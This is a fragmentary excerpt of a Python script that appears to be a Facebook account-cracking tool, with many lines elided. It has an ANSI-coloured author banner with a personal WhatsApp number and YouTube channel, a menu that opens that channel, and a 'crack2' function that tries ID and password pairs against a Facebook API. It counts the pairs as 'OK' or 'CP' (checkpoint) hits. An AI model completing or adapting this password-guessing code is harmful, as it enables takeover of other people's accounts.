...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mTahmid Xhowdhury 
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+447451221399
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1m Random Video Creator
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UCNNcbUxbMIGvi1Lv9DPaSvA")
		exit()
	else:
		os.system("https://youtube.com/channel/UCNNcbUxbMIGvi1Lv9DPaSvA")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [TAHMID] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [TAHMID-CP] %s|%s        '%(b,idf,pw))
